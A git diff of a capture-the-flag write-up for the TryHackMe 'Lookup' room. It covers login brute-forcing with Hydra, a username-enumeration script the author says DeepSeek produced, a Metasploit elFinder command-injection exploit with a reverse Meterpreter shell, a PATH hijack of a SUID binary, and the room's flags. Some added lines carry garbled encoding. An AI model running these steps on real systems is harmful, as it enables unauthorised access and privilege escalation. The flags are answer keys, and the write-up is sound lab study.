@@ -1,6 +1,6 @@
 [THM](https://tryhackme.com/room/lookup)
 
-nmap scan:
+Nmap scan:
 ```
 nmap -sV -O -T4 --min-rate=1000 $ip
 ```
@@ -14,14 +14,14 @@ Running: Linux 4.X
 OS CPE: cpe:/o:linux:linux_kernel:4.15
 OS details: Linux 4.15
 ```
-login form at http
-nothing in source code
-tried some common credentials like “admin:admin” and “admin:password” doesn’t work, and SQLi attempts also fail.
-tried enumerating subdomains and brute-forcing directories and files, but nothing came up.
-tried a brute-force on “admin” , but nothing worked
+Login form at HTTP
+Nothing in source code
+Tried some common credentials like "admin:admin" and "admin:password" - doesn't work, and SQLi attempts also fail.
+Tried enumerating subdomains and brute-forcing directories and files, but nothing came up.
+Tried a brute-force on "admin", but nothing worked
 
 
-gobuster:
+Gobuster:
 ```
 gobuster dir -u http://$ip -w /usr/share/dirb/wordlists/common.txt -t 300 -x txt,php,html -q
 ```
@@ -41,9 +41,9 @@ output
 /index.php            (Status: 302) [Size: 0] 
 /server-status        (Status: 403) [Size: 277]
 ```
-nothing here too
+Nothing here too
 
-observed the response
+Observed the response
 `user`=user
 `pass`=pass
 response:
@@ -58,9 +58,9 @@ response:
 Wrong password. Please try again.  
 Redirecting in 3 seconds.
 ```
-so there is username called `admin`
+So there is a username called `admin`
 
-went to deepseek give the following prompt:
+Went to DeepSeek and gave the following prompt:
 ```
 Create a Python script that performs a username enumeration attack on a login form. The script should:
 
@@ -135,8 +135,8 @@ def enumerate_usernames():
 if __name__ == "__main__":
     enumerate_usernames()
 ```
-saved it as a python file
-executed
+Saved it as a Python file
+Executed
 ```
 chmod +x usernamesenum.py
 python3 usernamesenum.py
@@ -148,7 +148,7 @@ admin
 jose
 ```
 
- used hydra as to brute on `jose`
+Used Hydra to brute-force on `jose`
  ```
  hydra -l jose -P /usr/share/wordlists/rockyou.txt $ip http-post-form -f -W 5 -t 64 "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again"
  ```
@@ -162,22 +162,22 @@ jose
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 03:14:14
  ```
- got the password as `password123`
+Got the password as `password123`
 
-upon logging in it goes to a sub domain` http://files.lookup.thm/`
- added to `/etc/hosts`
- saw many files
- downloaded the some and tried ssh with hydra- failed
- check the version of file manger
- saw that 
+Upon logging in it goes to a subdomain `http://files.lookup.thm/`
+Added to `/etc/hosts`
+Saw many files
+Downloaded some and tried SSH with Hydra - failed
+Check the version of file manager
+Saw that 
  ```
  ### elFinder
 Web file manager
 Version: 2.1.47
-protocol version: 2.1047
+protocol version:聽2.1047
 jQuery/jQuery UI: 3.3.1/1.12.1
  ```
- search for exploits:
+Search for exploits:
  ```
  searchsploit elFinder 2.1.47
  ```
@@ -189,9 +189,9 @@ elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)     
 elFinder PHP Connector < 2.1.48 - 'exiftran' Command Injection (Metasploit)                                                                                                                       | php/remote/46539.rb
 
  ```
- tried uploading python file it got failed to upload
+Tried uploading Python file - it failed to upload
 
-used metasploit
+Used Metasploit
 ```msf
 msf > search elfinder
 0  exploit/multi/http/builderengine_upload_exec
@@ -200,21 +200,21 @@ msf > search elfinder
 3  exploit/linux/http/elfinder_archive_cmd_injection
 4  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
 ```
-need a php connector so used 4
+Need a PHP connector so used 4
  ```msf
  msf > use 4
  msf > set RHOST files.lookup.thm
  msf > set LHOST 10.17.10.30
  msf > run
  ```
- got the meterpreter shell
+Got the Meterpreter shell
 ```
 meterpreter > shell
 Process 5654 created.
 Channel 0 created.
 ```
 
-did the basic things
+Did the basic things
 ```
 uname -a
 cat /etc/os-release
@@ -239,11 +239,11 @@ UBUNTU_CODENAME=focal
 
 www-data
 ```
-tried to read home directory
+Tried to read home directory
 ```
 ls /home
 ```
-there are 3 directories
+There are 3 directories
 ssm-user  think  ubuntu
 ```
 cd think
@@ -263,9 +263,9 @@ drw-r----- 2 think think 4096 Jun 21  2023 .ssh
 lrwxrwxrwx 1 root  root     9 Jun 21  2023 .viminfo -> /dev/null
 -rw-r----- 1 root  think   33 Jul 30  2023 user.txt
 ```
-saw the `user.txt` and the` .passwords`
+Saw the `user.txt` and the `.passwords`
 
-search for suid binaries
+Search for SUID binaries
 ```
 find / -perm /4000 2>/dev/null
 ```
@@ -312,15 +312,15 @@ output
 /usr/bin/pkexec
 /usr/bin/umount
 ```
-googled the results
-- **`/usr/sbin/pwm` - This is not a standard Linux command (might be specific to hardware or a custom installation).**
+Googled the results
+- **`/usr/sbin/pwm`聽- This is not a standard Linux command (might be specific to hardware or a custom installation).**
 ```
 ls -alps /usr/sbin/pwm
 20 -rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm
 ```
-also owned by root
-saw executable perms to others
-tried to execute
+Also owned by root
+Saw executable permissions to others
+Tried to execute
 ```
  /usr/sbin/pwm
 /usr/sbin/pwm
@@ -328,14 +328,14 @@ tried to execute
 [!] ID: www-data
 [-] File /home/www-data/.passwords not found
 ```
- this binary seems to execute the “id” command, and then extracts the username out of it, and then puts that username into “/home/< username >/.passwords” and tries to do something with it
+耇his binary seems to execute the "id" command, and then extracts the username out of it, and then puts that username into "/home/<username>/.passwords" and tries to do something with it
 
-If the “id” command is not specified with it’s full path (/bin/id), it is found and executed via the PATH variable in our environment.
+If the 鈥渋d鈥� command is not specified with it鈥檚 full path (/bin/id), it is found and executed via the PATH variable in our environment.
 ```
 echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-add /tmp to the $PATH
+Add /tmp to the $PATH
 ```
 export PATH=/tmp:$PATH
 bash-5.0$ echo $PATH
@@ -343,12 +343,12 @@ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
-created a file called id with these contents
+Created a file called id with these contents
 ```
 #!/bin/bash
 echo "uid=33(think) gid=33(think) groups=33(think)"
 ```
-run pwm
+Run pwm
 ```
 /usr/sbin/pwm
 ```
@@ -396,9 +396,9 @@ jose.hm
 jose.hater
 #etc......
 ```
-put these and try brute forcing
+Put these and try brute-forcing
 
-used hydra
+Used Hydra
 ```
 hydra -l think -P pass.txt lookup.thm ssh
 ```
@@ -412,17 +412,17 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 05:42:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-10 05:42:34
 ```
-got the password `josemario.AKA(think)`
-login through ssh
+Got the password `josemario.AKA(think)`
+Login through SSH
 ```
 think@ip-10-10-20-241:~$ ls
 user.txt
 think@ip-10-10-20-241:~$ cat user.txt
 38375fb4dd8baa2b2039ac03d92b820e
 ```
-user flag: `38375fb4dd8baa2b2039ac03d92b820e`
+User flag: `38375fb4dd8baa2b2039ac03d92b820e`
 
-check sudo perms
+Check sudo permissions
 ```
 sudo -l
 ```
@@ -434,9 +434,9 @@ Matching Defaults entries for think on ip-10-10-20-241:
 User think may run the following commands on ip-10-10-20-241:
     (ALL) /usr/bin/look
 ```
-look is allowed to use with sudo
+Look is allowed to use with sudo
 ```
 sudo look '' /root/root.txt
 5a285a9f257e45c68bb6c9f9f57d18e8
 ```
-root flag = `5a285a9f257e45c68bb6c9f9f57d18e8`
+Root flag = `5a285a9f257e45c68bb6c9f9f57d18e8`
